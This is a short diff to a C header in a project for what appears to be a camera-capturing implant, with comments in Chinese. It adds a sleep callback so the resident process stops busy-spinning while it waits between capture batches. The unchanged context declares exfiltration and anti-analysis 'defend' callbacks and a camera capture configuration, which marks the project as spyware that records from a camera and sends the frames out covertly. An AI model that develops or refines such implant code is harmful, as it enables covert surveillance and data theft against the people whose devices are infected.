@@ -74,6 +74,11 @@ typedef int (*implant_exfil_t)(const uint8_t *data, size_t len,
 
 /* 对抗自检：0 表示环境安全可运行，非 0 表示不安全。 */
 typedef int (*implant_defend_t)(void *ud);
+/* 等待期让出 CPU 的钩子。us 为距下一批到期的剩余微秒。
+ * 未注入时 ST_WAIT 直接返回（busy-spin），仅适用于注入固定时间源的单步
+ * 测试；常驻进程必须注入，否则等待期会吃满一个核，并让 implant_run 的
+ * 死循环保护把「等批间隔」误判成死循环（详见 src/implant.c）。 */
+typedef void (*implant_sleep_us_t)(uint64_t us, void *ud);
 
 typedef struct {
     cam_config_t cam;             /* 采集配置（宽高/fps/采集窗口/帧数） */
@@ -106,6 +111,7 @@ void implant_set_now(implant_t *im, implant_now_us_t fn, void *ud);
 void implant_set_pack(implant_t *im, implant_pack_t fn, void *ud);
 void implant_set_exfil(implant_t *im, implant_exfil_t fn, void *ud);
 void implant_set_defend(implant_t *im, implant_defend_t fn, void *ud);
+void implant_set_sleep(implant_t *im, implant_sleep_us_t fn, void *ud);
 
 /* 推进一步状态机。返回 IMPLANT_OK / IMPLANT_STOPPED / 具体错误码 */
 implant_err_t implant_step(implant_t *im);
